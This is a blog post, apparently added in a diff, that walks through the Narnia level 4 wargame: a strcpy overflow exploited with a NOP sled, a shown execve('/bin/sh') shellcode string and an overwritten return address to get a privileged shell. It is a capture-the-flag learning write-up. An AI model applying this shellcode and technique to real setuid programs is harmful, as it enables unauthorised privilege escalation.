@@ -1,0 +1,62 @@
+---
+layout: post
+title: "Bigger Buffer Overflow - Brute Forcing into privileges"
+date: 2018-09-22
+category: projects
+---
+<div class="article">
+<p>
+  This article is about how a bigger buffer can be overflowed and a return address be given so as to get administrative privileges.
+  The method is hugely similar to this post <b><a href="https://karthik-balu.github.io/projects/2018/07/05/Cybersecurity-GDB">here</a></b>.
+  Lets jump straight into practice! SSH into narnia4 with password obtained from <b><a href="https://karthik-balu.github.io/projects/2018/08/17/Cybersecurity-Narnia3">here</a></b>.
+</p>
+
+  <ul class="list-unstyled bold-head">
+
+    <li>Snap of /narnia/narnia4.c</li>
+    <img src="/static/images/projects/p13/i1.png" class="image-center image-biggest" />
+    <li>What is the vulnerability?</li>
+    <p>
+      String copy of commandline argument into buffer variable is done.
+      <pre class="prettyprint">
+        <code>
+        strcpy(buffer, argv[1]);
+      </code>
+      </pre>
+      Buffer overflow of the variable buffer and return address of main should be done and NOP sled can be used to overwrite return address to some address within the buffer to execute our shell-code payload.
+    </p>
+    <li>Exploitation Steps:</li>
+    <ol>
+      <li>Go to /narnia folder. Enter <b>gdb ./narnia4</b> and disassemble the main function with <b>"(gdb)disas main"</b></li>
+      Snap:<br>
+      <img src="/static/images/projects/p13/i3.png" class="image-center image-biggest" />
+      <li>You can see the line "sub $0x104 %esp" line which adds 260 bytes to stack pointer.
+      </li>
+      <li>Run <b>gdb --args ./narnia4 $(python -c 'print "0x41"*260' )</b> and do "(gdb) run"and slowly increase from 260 till the return address for segmentation fault is overwritten with ""\x41\x41\x41\x41". I reached this point at 268 </li>
+      <li>So taking payload as same previous shell-code used in Narnia Level 2, 34 bytes + return address 4 bytes leaves 230 bytes for NOP. Sending this as argument through GDB to choose appropriate return address</li>
+
+      <pre class="prettyprint">
+        <code>
+          gdb --args /narnia/narnia4 $(python -c 'print "\x90"*230+"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"+"\x00\x00\x00\x00"')
+          (gdb) run
+          (gdb) x/150x $esp
+          (gdb) quit
+      </code>
+      </pre>
+      Snap:<br>
+      <img src="/static/images/projects/p13/i4.png" class="image-center image-biggest" />
+      <li>In above snap, choosing return address as 0xffffd810. Now run the program narnia4 with this return address.</li>
+      Snap: <br>
+      <img src="/static/images/projects/p12/i2.png" class="image-center image-biggest" />
+      <li>Shell is opened with elevated privileges of narnia5 as can be seen above and you can cat the password for Level 5!</li>
+    </ol>
+
+    <p>
+      <li>Behind the scenes explanation:</li>
+      It is same as Narnia Level 2. You are merely bruteforcing your way here to overwrite return address of main function with your desired return address and running the shell-code.
+      Shell is opened with elevated privileges and You get your password!
+    </p>
+
+    </ul>
+
+</div>
